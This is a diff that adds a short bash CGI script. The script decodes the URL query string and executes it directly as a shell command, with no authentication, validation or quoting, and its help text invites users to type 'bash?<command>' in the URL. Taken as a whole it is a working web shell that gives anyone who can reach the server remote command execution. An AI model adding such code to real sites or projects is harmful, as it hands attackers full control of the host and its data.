@@ -1,0 +1,14 @@
+#!/bin/bash
+echo "Content-Type: text/plain"
+echo
+
+if [ -z $QUERY_STRING ]; then
+  echo "Please supply a query.  (If you are using a browser, type bash?<command> in the url)"
+else
+  BASH_CMD="$(../urldec $QUERY_STRING 2>&1)"
+  if [ $? -ne 0 ]; then
+    echo "Failed to decode the url query string \"$QUERY_STRING\""
+  else
+    $BASH_CMD 2>&1
+  fi
+fi
